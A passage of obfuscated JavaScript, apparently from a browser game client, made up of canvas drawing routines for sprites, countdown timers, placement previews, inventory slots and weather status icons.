				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ⵠΔⲆⵠ;
				var ⲆⵠⲆ = 0
			}
			Δ.globalAlpha = .5;
			ⲆᐃΔⵠᐃⵠᐃ(Δ, Δⵠ, ⲆⵠⲆ, ᐃᐃᐃᐃⲆ * ᐃ, ᐃⵠΔᐃⵠ);
			ΔⲆ(Δ, null, ⵠ[339], ᐃ * 18);
			Δ.globalAlpha = 1;
			ⲆᐃΔⵠᐃⵠᐃ(Δ, Δⵠ, ⲆⵠⲆ, ᐃ * 18, ᐃⵠΔᐃⵠ);
			ΔⲆ(Δ, null, Ⲇ.ᐃᐃᐃⲆΔⲆⲆ[ⲆⲆⲆ.time], 6 * ᐃ);
			Δ.restore()
		}

		function ΔᐃᐃΔΔᐃⲆΔΔ(ᐃΔ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == ᐃⵠⵠⲆᐃ) this.Δᐃⵠ.ⵠⲆᐃ = ⲆΔⲆᐃΔ;
				var ΔᐃΔ = (ⵠΔⲆ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600 * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = ⵠⲆⲆ;
				var ⲆⵠⲆ = ΔⲆⲆ
			}
			if (ᐃΔ === Ⲇ.ⵠΔⲆⵠⲆⲆⵠ && !ⲆⲆⲆ.transition) {
				var ᐃⲆⵠΔⲆ = 0;
				var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
				for (var ⵠᐃ = 0; ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					var ᐃⵠⵠᐃ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ᐃᐃᐃⵠ[ⵠᐃ], this);
					if (140 > ᐃⵠⵠᐃ && ᐃⵠⵠᐃ > 35) {
						ᐃⲆⵠΔⲆ = 0;
						break
					} else if (ᐃⵠⵠᐃ <= 35) ᐃⲆⵠΔⲆ = ⵠΔⲆ
				}
				ᐃⲆⵠΔⲆ === ΔΔⵠⵠ ? this.opacity = Math.max(.5, this.opacity - ᐃⵠᐃᐃ / 1.5) : this.opacity = Math.min(ⵠΔⵠΔ, this.opacity + ᐃⵠᐃᐃ / 1.5);
				Δ.globalAlpha = this.opacity
			}
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠⵠΔⲆ + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.restore()
		}

		function ⲆᐃⲆⲆΔⵠΔᐃⵠ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔᐃᐃᐃᐃⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ⵠⵠΔⵠⵠᐃⲆ(ᐃΔ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = (ΔΔΔ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600 * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ΔΔⵠ;
				var ⲆⵠⲆ = ΔΔⵠ
			}
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / ᐃⲆΔⲆ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ᐃⲆᐃⲆᐃⵠΔⲆᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔΔⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔⵠᐃⲆ, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ΔⲆᐃΔΔⲆΔⲆᐃ() {
			var ⲆⲆⵠⲆΔ = ᐃᐃΔ.ⲆⲆⵠⲆΔ;
			if (ⲆⲆⵠⲆΔ.wait) {
				var ΔΔᐃΔⵠ = ⲆⲆⵠⲆΔ.timeout.ⵠⲆᐃ();
				Δ.save();
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⲆⲆΔᐃᐃ];
				Δ.translate(ᐃⵠ.width - ᐃ * Δᐃⵠⵠ, ΔⵠⵠⲆ.ⲆΔⲆⵠ.translate.y - ᐃ * 125);
				var Δⵠ = -ᐃⵠ.width / 2 + ᐃΔⲆᐃⵠ;
				var ⲆⵠⲆ = -ᐃⵠ.height / ΔⵠⵠΔ - 4;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
				Δ.beginPath();
				Δ.lineWidth = ᐃⲆⵠΔ * ᐃ;
				Δ.strokeStyle = Ⲇ.ⵠⵠⵠⵠⲆⵠΔ[ⲆⲆⲆ.time];
				Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
				Δ.arc(ⵠⲆΔⵠⵠ, ⲆⵠⲆ + ᐃⵠ.height / ΔⵠⵠΔ, 25 * ᐃ, ⲆΔⵠ, ⲆⲆⵠⲆΔ.timeout.ΔᐃΔ * (Math.PI * 2));
				Δ.stroke();
				Δ.restore();
				ΔΔᐃΔⵠ && (ⲆⲆⵠⲆΔ.wait = false, ⲆⲆⵠⲆΔ.timeout.ΔᐃΔ = ⲆΔⵠ, ⲆⲆⵠⲆΔ.timeout.ᐃⲆΔ = ⵠᐃΔΔⵠ)
			}
		}

		function ᐃᐃⵠΔⲆᐃⲆⲆΔ() {
			var ⵠΔΔᐃⵠ = ᐃᐃΔ.ⵠΔΔᐃⵠ;
			if (ⵠΔΔᐃⵠ.wait) {
				var ΔΔᐃΔⵠ = ⵠΔΔᐃⵠ.timeout.ⵠⲆᐃ();
				Δ.save();
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠΔΔΔⵠⵠ];
				var ΔⲆᐃΔⲆ = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃᐃⲆ].height + ᐃ * 25;
				Δ.translate(ᐃⵠ.width, ΔⵠⵠⲆ.ⲆΔⲆⵠ.translate.y - 188 * ᐃ - ΔⲆᐃΔⲆ);
				var Δⵠ = -ᐃⵠ.width / ᐃⲆⵠᐃ - ⲆᐃᐃⲆ;
				var ⲆⵠⲆ = -ᐃⵠ.height / Δⵠⵠⵠ - 4;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ + 2, ⲆⵠⲆ);
				Δ.beginPath();
				Δ.lineWidth = 5 * ᐃ;
				Δ.strokeStyle = Ⲇ.ΔᐃⵠⲆⲆᐃⵠ[ⲆⲆⲆ.time];
				Δ.lineCap = ⵠ[ΔᐃΔⲆ];
				Δ.arc(Ⲇᐃⵠⵠ, ⲆⵠⲆ + ᐃⵠ.height / ⵠΔⲆᐃ, 25 * ᐃ, 0, Math.PI * 2 * ⵠΔΔᐃⵠ.timeout.ΔᐃΔ);
				Δ.stroke();
				Δ.restore();
				ΔΔᐃΔⵠ && (ⵠΔΔᐃⵠ.wait = ᐃᐃⵠΔⵠ, ⵠΔΔᐃⵠ.timeout.ΔᐃΔ = ΔⲆⵠⲆ, ⵠΔΔᐃⵠ.timeout.ᐃⲆΔ = ⲆΔᐃⲆΔ)
			}
		}

		function ᐃΔᐃⵠᐃ(ᐃⵠΔᐃⵠ) {
			var ᐃⵠΔᐃⵠ = ᐃⵠΔᐃⵠ / 100;
			if (.95 < ᐃⵠΔᐃⵠ) return;
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = false;
				var ΔᐃΔ = ᐃ * (600 * (ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)));
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = Ⲇᐃᐃᐃ;
				var ⲆⵠⲆ = 0
			}
			Δ.globalAlpha = .5;
			ⲆᐃΔⵠᐃⵠᐃ(Δ, Δⵠ, ⲆⵠⲆ, ᐃ * 28, ᐃⵠΔᐃⵠ);
			ΔⲆ(Δ, null, ⵠ[339], 18 * ᐃ);
			Δ.globalAlpha = ΔⵠⲆΔ;
			ⲆᐃΔⵠᐃⵠᐃ(Δ, Δⵠ, ⲆⵠⲆ, 28 * ᐃ, ᐃⵠΔᐃⵠ);
			ΔⲆ(Δ, null, Ⲇ.ⲆΔⵠⲆᐃΔⵠ[ⲆⲆⲆ.time], ⵠᐃΔⵠⲆ * ᐃ);
			Δ.restore()
		}

		function ΔⲆᐃⲆΔⲆⵠᐃⵠ() {
			var ⵠΔΔⲆ = ᐃᐃΔ.ⵠΔΔⲆ;
			if (!ⵠΔΔⲆ.ⲆΔΔⲆⲆ && ⵠΔΔⲆ.ᐃΔᐃᐃ > ⵠΔⲆⵠ) {
				var ᐃᐃᐃΔ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				if (!ᐃᐃᐃΔ) return;
				Δ.save();
				if (ⲆⲆⵠᐃ[ⵠΔΔⲆ.ᐃΔᐃᐃ].ᐃᐃⲆⵠ === 0 && Δᐃᐃⵠ === ⵠΔΔⲆ.mode) {
					Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + ᐃᐃᐃΔ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃᐃᐃΔ.y);
					Δ.rotate(ᐃᐃᐃΔ.angle);
					Δ.translate(120, 0)
				} else {
					var Δⵠ = Math.floor(ᐃᐃᐃΔ.x + 120 * Math.sin(ᐃᐃᐃΔ.angle));
					var ⲆⵠⲆ = Math.floor(ᐃᐃᐃΔ.y + Math.cos(ᐃᐃᐃΔ.angle) * 120);
					Δⵠ = ᐃᐃΔ.ⲆΔΔ.x + (Δⵠ - Δⵠ % ᐃΔⲆⲆᐃ + 50);
					ⲆⵠⲆ = ᐃᐃΔ.ⲆΔΔ.y + (ⲆⵠⲆ - ⲆⵠⲆ % 100 + 50);
					Δ.translate(Δⵠ, ⲆⵠⲆ)
				}
				var ᐃⵠ = ⵠⲆ[ⵠΔΔⲆ.ᐃΔᐃᐃ][ⲆⲆⲆ.time];
				Δ.globalAlpha = .5;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
				Δ.globalAlpha = 1;
				Δ.restore();
				if (ᐃⵠⲆ === ⲆⲆⵠᐃ[ⵠΔΔⲆ.ᐃΔᐃᐃ].ᐃᐃⲆⵠ) {
					if (!ⵠΔΔⲆ.label[ⵠΔΔⲆ.mode]) {
						if (ᐃⵠΔ === ⵠΔΔⲆ.mode) ⵠΔΔⲆ.label[0] = ᐃᐃΔΔᐃ(ᐃ, ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ], ΔⲆᐃᐃᐃⲆⲆ, "#e2c340");
						else ⵠΔΔⲆ.label[1] = ᐃᐃΔΔᐃ(ᐃ, ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ], ⵠΔΔⲆⲆ, "#e2c340")
					}
					var ᐃⵠ = ⵠΔΔⲆ.label[ⵠΔΔⲆ.mode];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ + -ᐃⵠ.width / ⵠⵠⵠΔ, ΔⵠⵠⲆ.ⲆΔⲆⵠ.y - 26)
				}
			}
			if (ⵠΔΔⲆ.ⲆΔΔⲆⲆ) {
				var ΔΔᐃΔⵠ = ⵠΔΔⲆ.timeout.ⵠⲆᐃ();
				for (var ⵠᐃ = ⵠᐃⲆᐃ; ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length > ⵠᐃ; ⵠᐃ++) {
					var ⲆⲆᐃᐃ = ⵠΔΔⲆ.ⵠⵠᐃΔᐃ[ⵠᐃ];
					if (ⵠΔΔⲆ.id == ⲆⲆᐃᐃ.id) {
						var ⵠⵠᐃ = ᐃ * 42;
						var ΔΔⵠⲆᐃ = ⵠⲆᐃⵠⵠΔⵠ * ᐃ;
						Ⲇᐃᐃ(Δ, ⲆⲆᐃᐃ.info.translate.x, ⲆⲆᐃᐃ.info.translate.y + ⵠⵠᐃ * (1 - ⵠΔΔⲆ.timeout.ΔᐃΔ), ⲆⲆᐃᐃ.info.width, ⵠⵠᐃ * ⵠΔΔⲆ.timeout.ΔᐃΔ + ΔΔⵠⲆᐃ, ᐃ * 10);
						Δ.fillStyle = "#55B973";
						Δ.fill();
						Δ.globalAlpha = .8;
						ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ)
					} else {
						Δ.globalAlpha = .5;
						ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ)
					}
					Δ.globalAlpha = 1
				}
				if (ΔΔᐃΔⵠ) {
					ⵠΔΔⲆ.ⲆΔΔⲆⲆ = ᐃⵠΔⵠⲆ;
					ⵠΔΔⲆ.timeout.ΔᐃΔ = ⲆΔⵠ;
					ⵠΔΔⲆ.timeout.ᐃⲆΔ = false
				}
				return true
			} else {
				for (var ⵠᐃ = 0; ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length > ⵠᐃ; ⵠᐃ++) ⵠΔΔⲆ.ⵠⵠᐃΔᐃ[ⵠᐃ].ΔᐃΔⵠ(Δ)
			}
			return ⲆᐃⵠⲆⵠ
		}

		function ⲆⲆⵠⵠⲆⲆᐃᐃⲆ() {
			var ⲆᐃΔᐃΔ = ᐃᐃΔ.ⲆᐃΔᐃΔ;
			if (ⲆᐃΔᐃΔ.wait) {
				var ΔΔᐃΔⵠ = ⲆᐃΔᐃΔ.timeout.ⵠⲆᐃ();
				Δ.save();
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃᐃⲆ];
				Δ.translate(ᐃⵠ.width - 2 * ᐃ, ΔⵠⵠⲆ.ⲆΔⲆⵠ.translate.y - 60 * ᐃ);
				var Δⵠ = -ᐃⵠ.width / 2 - ⵠΔⲆᐃ;
				var ⲆⵠⲆ = -ᐃⵠ.height / 2 - 4;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
				Δ.beginPath();
				Δ.lineWidth = 5 * ᐃ;
				Δ.strokeStyle = Ⲇ.ΔᐃⵠⲆⲆᐃⵠ[ⲆⲆⲆ.time];
				Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
				Δ.arc(ᐃⵠΔ, ⲆⵠⲆ + ᐃⵠ.height / 2, ᐃ * 25, 0, ⲆᐃΔᐃΔ.timeout.ΔᐃΔ * (ⲆᐃᐃⲆ * Math.PI));
				Δ.stroke();
				Δ.restore();
				ΔΔᐃΔⵠ && (ⲆᐃΔᐃΔ.wait = ⲆⲆⲆᐃⵠ, ⲆᐃΔᐃΔ.timeout.ΔᐃΔ = ⵠΔⲆⵠ, ⲆᐃΔᐃΔ.timeout.ᐃⲆΔ = false)
			}
		}

		function ΔⵠᐃᐃᐃⲆᐃΔⲆ() {
			var ⲆⵠⲆⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length; ⵠᐃ++) {
				var ⲆⲆᐃᐃ = ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ[ⵠᐃ];
				var ΔⵠⲆ = false;
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				if (ᐃⲆⲆ && (ᐃⲆⲆ.right == ⲆⲆᐃᐃ.id || ⲆⲆᐃᐃ.id == ᐃⲆⲆ.Ⲇⵠᐃᐃᐃ && Δᐃᐃᐃ < ᐃⲆⲆ.Ⲇⵠᐃᐃᐃ)) {
					ΔⵠⲆ = true;
					ΔⲆΔⵠ(Δ, ⲆⲆᐃᐃ.info.ᐃⵠ[2], ⲆⲆᐃᐃ.info.translate.x, ⲆⲆᐃᐃ.info.translate.y, ⲆⲆᐃᐃ.info.width, ⲆⲆᐃᐃ.info.height)
				} else ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
				var ᐃⵠⵠⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ⲆⲆᐃᐃ.id];
				if (1 < ᐃⵠⵠⵠ) Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ);
				ᐃⵠⵠⵠ > 0 && ᐃⲆⲆᐃΔᐃⵠΔⲆ(ⵠᐃ, ⲆⲆᐃᐃ, ΔⵠⲆ);
				var ⲆᐃⲆΔ = ᐃᐃΔ.ⲆᐃⲆΔ;
				if (ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ⲆᐃⲆΔ.id < ΔΔⵠⵠ || ⲆᐃⲆΔ.id == ⲆⲆᐃᐃ.id) && (!ⲆᐃⲆΔ.lock || ⲆᐃⲆΔ.ⲆⵠⵠΔ == ᐃᐃΔ.id)) ΔⵠⵠⲆ.ΔΔᐃⵠⲆ[ⲆⲆᐃᐃ.id].ΔᐃΔⵠ(Δ);
				var ΔⲆᐃⲆⵠ = ᐃᐃΔ.ΔⲆᐃⲆⵠ;
				ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ⲆⲆᐃᐃ.id == ᐃᐃ.ⵠⲆⲆᐃ && ΔⵠⵠⲆ.ΔΔᐃⵠⲆ[ⲆⲆᐃᐃ.id].ΔᐃΔⵠ(Δ);
				var Ⲇⵠⵠⵠⵠ = ᐃᐃΔ.Ⲇⵠⵠⵠⵠ;
				Ⲇⵠⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ⲆⲆᐃᐃ.id == ᐃᐃ.ΔⵠⵠⵠΔ && ΔⵠⵠⲆ.ΔΔᐃⵠⲆ[ⲆⲆᐃᐃ.id].ΔᐃΔⵠ(Δ);
				var ΔΔΔⵠ = ᐃᐃΔ.ΔΔΔⵠ;
				ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ⲆⲆᐃᐃ.id == ᐃᐃ.ⵠⲆⲆⲆⵠ && ΔⵠⵠⲆ.ΔΔᐃⵠⲆ[ⲆⲆᐃᐃ.id].ΔᐃΔⵠ(Δ);
				var ⲆΔΔⲆ = ᐃᐃΔ.ⲆΔΔⲆ;
				if (ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ⵠⲆⲆᐃ == ⲆⲆᐃᐃ.id) ΔⵠⵠⲆ.ΔΔᐃⵠⲆ[ⲆⲆᐃᐃ.id].ΔᐃΔⵠ(Δ);
				var ᐃΔᐃΔ = ᐃᐃΔ.ᐃΔᐃΔ;
				if (ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ⲆⲆᐃᐃ.id == ᐃᐃ.ⵠⲆⲆᐃ || ᐃᐃ.ⵠᐃⲆⵠᐃ == ⲆⲆᐃᐃ.id)) ΔⵠⵠⲆ.ΔΔᐃⵠⲆ[ⲆⲆᐃᐃ.id].ΔᐃΔⵠ(Δ)
			}
			if (ⲆⲆᐃᐃ && ⵠᐃ < ⲆⵠⲆⵠ.max) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⵠⲆΔ][ⵠⵠⵠΔ];
				Δⵠ = ⲆⲆᐃᐃ.info.translate.x;
				ⲆⵠⲆ = ⲆⲆᐃᐃ.info.translate.y;
				for (ᐃⵠᐃⵠ = 1; ⵠᐃ < ⲆⵠⲆⵠ.max; ⵠᐃ++, ᐃⵠᐃⵠ++) ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ + (ᐃⵠ.width + ᐃᐃⲆᐃ) * ᐃⵠᐃⵠ, ⲆⵠⲆ)
			}
		}

		function ᐃᐃΔᐃⲆⵠⲆᐃⲆ() {
			var ⲆⵠⲆ = -8;
			if (ᐃᐃΔ.ⵠⲆⵠᐃᐃ.enabled) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⵠᐃⲆᐃⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ);
				ⲆⵠⲆ += 70
			}
			if (ΔⲆⵠ === ᐃᐃΔ.Δⵠⵠⵠⵠᐃᐃ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃΔⲆⵠⲆⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ);
				ⲆⵠⲆ += 70
			} else if (.25 > ᐃᐃΔ.ⲆΔⲆⵠ.ΔΔⲆⲆᐃ.x || ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⵠⵠΔⵠᐃ.x < .25 || ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⲆⲆΔⲆⵠ.x < .25 || ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⵠΔⵠᐃⲆᐃ.x < .25 || .25 > ᐃᐃΔ.ⲆΔⲆⵠ.ΔⵠⵠⲆⲆ.x) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔᐃⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ);
				ⲆⵠⲆ += 70
			}
			if (ᐃᐃΔ.ᐃΔⵠⲆᐃ > 0) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⲆΔⵠⵠΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ);
				var ᐃΔⵠⲆᐃ = ΔᐃΔⵠⵠΔᐃ[ᐃᐃΔ.ᐃΔⵠⲆᐃ];
				undefined === ᐃΔⵠⲆᐃ && (ᐃΔⵠⲆᐃ = ᐃᐃΔΔᐃ(ᐃ, ᐃᐃΔ.ᐃΔⵠⲆᐃ + "", 30, "#FDFDFD", null, null, null, null, null, "#C8BBBF", 6), ΔᐃΔⵠⵠΔᐃ[ᐃᐃΔ.ᐃΔⵠⲆᐃ] = ᐃΔⵠⲆᐃ);
				ⵠⲆⲆΔᐃ > ᐃᐃΔ.ᐃΔⵠⲆᐃ ? ΔⲆΔⵠ(Δ, ᐃΔⵠⲆᐃ, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x - 39, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ + 20) : ΔⲆΔⵠ(Δ, ᐃΔⵠⲆᐃ, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x - 46, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ + 20);
				ⲆⵠⲆ += 70
			}
			if (Settings.WeatherInfo.enabled) {
				const ctx = Δ;
				if (ᐃᐃΔ.ⲆᐃΔⲆΔ.ⲆⵠᐃᐃΔ) {
					ctx.save();
					ctx.drawImage(BlizzardImage, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ);
					ctx.restore();
					ⲆⵠⲆ += 70
				}
				if (ᐃᐃΔ.ⵠⲆΔᐃⵠ.ⲆⵠᐃᐃΔ) {
					ctx.save();
					ctx.drawImage(SandstormImage, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x, ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + ⲆⵠⲆ);
					ctx.restore();
					ⲆⵠⲆ += 70
				}
			}
		}

		function ⲆᐃⵠⵠΔᐃⵠᐃᐃ(ᐃΔ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = ᐃ * (600 * (ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)));
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ᐃΔΔ;
				var ⲆⵠⲆ = 0
			}
			if (this.ΔⲆΔⲆⵠ.ⵠⲆᐃ()) this.color += .2 + Math.random() * .3;
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][Math.floor(this.id + this.color) % ⵠᐃⲆΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ΔⲆΔⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ΔⲆΔⲆⵠ.ΔᐃΔ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ᐃⵠⲆⲆⲆ + Δⵠ, -ⵠⵠᐃ / ⲆⵠΔΔ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ΔⵠⵠΔⲆⵠⵠᐃⵠ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃᐃΔⵠᐃⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ⲆΔⲆⵠⲆⲆⵠⵠΔ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
